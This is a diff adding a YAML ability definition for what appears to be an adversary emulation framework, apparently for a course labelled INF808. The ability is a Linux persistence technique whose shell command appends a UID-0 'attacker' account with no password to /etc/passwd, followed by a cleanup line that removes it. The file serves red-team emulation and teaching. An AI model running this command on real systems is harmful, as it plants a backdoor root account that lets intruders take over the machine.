@@ -1,0 +1,18 @@
+ability_id: "fc5efaa4-a4f1-4868-87fa-df5525667974"
+tactic: "persistence"
+technique_name: "Abuse Elevation Control"
+technique_id: "T1548.002"
+name: "INF808 - Persistence: Create Root User"
+description: "Créer un utilisateur root dans le fichier /etc/passwd"
+executors:
+  - name: "sh"
+    platform: "linux"
+    command: "echo 'attacker:x:0:0:attacker:/root:/bin/bash' >> /etc/passwd"
+    cleanup:
+      - "sed -i '/attacker:x:0:0:attacker/d' /etc/passwd"
+    timeout: 60
+requirements: []
+privilege: ""
+repeatable: false
+buckets: ["persistence"]
+delete_payload: true
